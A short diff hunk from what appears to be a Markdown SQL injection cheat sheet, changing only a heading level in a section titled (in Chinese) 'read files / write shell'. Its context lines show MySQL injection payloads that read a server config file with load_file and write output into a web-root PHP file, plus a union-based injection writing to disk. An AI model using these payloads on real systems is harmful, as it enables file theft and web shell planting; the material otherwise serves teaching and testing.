@@ -137,7 +137,7 @@ SELECT CAST(’12’ AS int)
   select load_file('c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini') into outfile 'c:\\wamp\\www\\test.php'
   ```
 
-### 五. 读文件/写shell
+## 五. 读文件/写shell
   - union方式  
     ```sql
     -1 union select 1,user(),3 into outfile "C:\\test.txt" --+
